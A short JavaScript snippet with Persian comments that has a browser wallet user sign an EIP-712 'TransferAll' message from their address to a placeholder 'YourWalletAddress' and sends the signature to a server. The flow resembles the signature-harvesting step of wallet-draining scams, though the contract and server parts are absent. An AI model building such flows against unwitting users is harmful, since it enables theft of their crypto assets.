async function signMessage() {
  const provider = new ethers.BrowserProvider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  const signer = await provider.getSigner();
  const address = await signer.getAddress();

  const deadline = Math.floor(Date.now() / 1000) + 600;
  const message = {
    from: address,
    to: "0xYourWalletAddress", // آدرس مقصد
    deadline
  };

  const domain = {
    name: "TransferAll",
    version: "1",
    chainId: await signer.provider.getNetwork().then(n => n.chainId),
    verifyingContract: "0x0000000000000000000000000000000000000000"
  };

  const types = {
    TransferAll: [
      { name: "from", type: "address" },
      { name: "to", type: "address" },
      { name: "deadline", type: "uint256" }
    ]
  };

  const signature = await signer.signTypedData(domain, types, message);

  // ارسال به سرور
  const res = await fetch("/verify-signature", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address, signature, message })
  });

  const data = await res.json();
  document.getElementById("result").innerText = data.msg;
}